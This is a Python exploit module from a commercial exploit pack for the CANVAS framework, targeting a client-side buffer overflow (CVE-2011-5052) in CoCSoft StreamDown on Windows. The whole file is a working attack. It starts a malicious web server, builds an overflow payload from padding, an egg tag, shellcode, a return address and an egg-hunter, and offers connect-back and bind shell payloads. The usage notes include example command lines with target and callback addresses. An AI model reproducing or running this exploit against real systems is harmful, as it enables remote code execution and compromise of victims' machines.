
#! /usr/bin/env python
#####################################################################################
# White Phosphorus Exploit Pack
#
# Proprietary source code - use only under the license agreement in distribution
#
#####################################################################################


import sys 
sys.path.append(".")
sys.path.append("3rdparty/White_Phosphorus/libs")

import os
import socket
import time
from struct import *

from wp_exploit import *
from wp_dialog import *
from wp_osversions import *
import canvasengine
from MOSDEF import mosdef 
from MOSDEF.mosdefutils import *
from MOSDEFShellServer import MosdefShellServer


NAME = "CoCSoft StreamDown Clientside Overflow"
DESCRIPTION = "Exploits a clientside verflow in CoCSoft StreamDow"
VERSION = "1.0"
DOCUMENTATION = {}
DOCUMENTATION['VENDOR']='CoCSoft'
DOCUMENTATION["Date public"] = "2011-12-27"
DOCUMENTATION["Repeatability"] = "One Shot"
DOCUMENTATION['CVE Name']="CVE-2011-5052"
DOCUMENTATION['CVE Url'] = 'http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2011-5052'
DOCUMENTATION['CVSS'] = '0.0'
DOCUMENTATION["References"] = "http://www.exploit-db.com/exploits/18283/"
DOCUMENTATION["Notes"] = """
"""

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Windows"] ]
PROPERTY['VERSION'] = [ "XP", "Vista", "7"]

NOTES="""
------------------------------------------
WP> White Phosphorus Exploit Pack
WP> CoCSoft StreamDown Clientside Overflow
------------------------------------------
Usage:
-T (check if target is vulnerable)
-v <version to target>
-t <target ip>   -p <target port>
-l <callback ip> -d <callback port>

Payload Options:
-O payload:<#>   (will use default if not specified)
-O command:<cmd> (for Execute Command payload)
-O bind:<port>   (for Bind MOSDEF Shell)

Versions:
0: Windows Universal (Non DEP)

Payloads:
0: TCP Connect Back
1: IE Inject Connect Back
2: HTTPMOSDEF SSL
3: HTTPMOSDEF PLAIN
4: Bind MOSDEF Shell
5: Execute Command
6: Socket Reuse

Example:
./commandlineInterface.py -p 5555 -v 17
./3rdparty/White_Phosphorus/exploits/wp_cocsoft_streamdown/wp_cocsoft_streamdown.py -v 0 -t 10.1.1.10 -l 10.1.1.1 -d 5555 -O payload:0
"""

PORT = 80

def dialog_update(gtk, wt):
    wp_dialog_update(gtk, wt, theexploit, targets, PORT)
    return

targets = {
    0 : ["Windows Universal (Non DEP)", (0x0000), [WINALL]]
}

class theexploit(wp_exploit):
    PAYLOADS=["TCP Connect Back",
              "IE Inject Connect Back",
              "HTTPMOSDEF SSL",
              "HTTPMOSDEF PLAIN",
              "Bind MOSDEF Shell",
              "Execute Command"]

    DEFAULT_PAYLOAD = 0

    def __init__(self):
        tcpexploit.__init__(self)
        self.host = "127.0.0.1"
        self.port = PORT
        self.targets = targets
        self.version = 0
        self.badstring = "\x00\x0a\x0d\x20"
        self.setInfo(DESCRIPTION)
        self.setInfo(VERSION)
        self.name = NAME
        self.autoVersioned = False
        self.use_universal = True
        self.alignstack = True
        self.encode_printable = True
        return

    def usage(self):
        self.wp_usage(targets)
        return  
    
    def test(self):
        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return wp_isPortOpen(self,self.host,self.port)

    def neededListenerTypes(self):
        self.getArgs()
        return self.wp_createWin32Listener()

    def createShellcode(self):
        self.getArgs()

        self.log('WP> Targeting version %d: %s'%(self.version,targets[self.version][0]))
        return self.wp_createShellcode()    

    def getArgs(self):
        self.wp_getShellcodeType()

        self.host=self.target.interface
        self.port=int(self.argsDict.get("port",self.port))
        return

    def displayVersions(self):
        for t in targets.keys():
            print 'WP> Version %d: %s'%(t,targets[t][0])
        return

    def makesploit(self):
        payload = wp_randomstring(100)
        payload += 'c00kc00k'
        payload += '\x8B\xE7\x83\xC4\x05' 
        payload += self.shellcode
        payload += wp_randomstring(16392-len(payload))
        payload += pack('<L', 0x10017F40)
        payload += wp_SearchCode(False)
        payload += wp_randomstring(21508-len(payload))
        return payload

    def run(self):
        self.getArgs()
        
        payload = self.makesploit()   
        self.log("WP> Starting malicious Web Server on %s:%d"%(self.callback.ip,self.port))          
        self.result_error = 0
        try:
            s = self.gettcpsock()
            s.bind((self.callback.ip, self.port))
            s.listen(5)
        except:
            self.log("WP> Unable to listen"%self.port)
            self.setInfo("WP> %s attacking %s:%d - completed (failed!)"%(NAME,self.host,self.port))
            return 0

        s.settimeout(0)
        data = ''
        while 1:
            try:
                c_s, c_addr = s.accept()
                self.log("WP> Received connection from: %s"%str(c_addr[0]))
                data = c_s.recv(1024)
                c_s.send(payload)
                time.sleep(1)
                c_s.close()
                break
            except timeoutsocket.Timeout:
                pass

        if self.result_error==0:
            ret = self.wp_postExploitShellcode(s)
            if ret:
                return ret

        ret=self.ISucceeded()
        self.setInfo("WP> %s attacking %s:%d - completed"%(NAME,self.host,self.port))
        return ret

if __name__== '__main__':
    print 'WP> Running White Phosphorus %s Exploit v %s'%(NAME,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
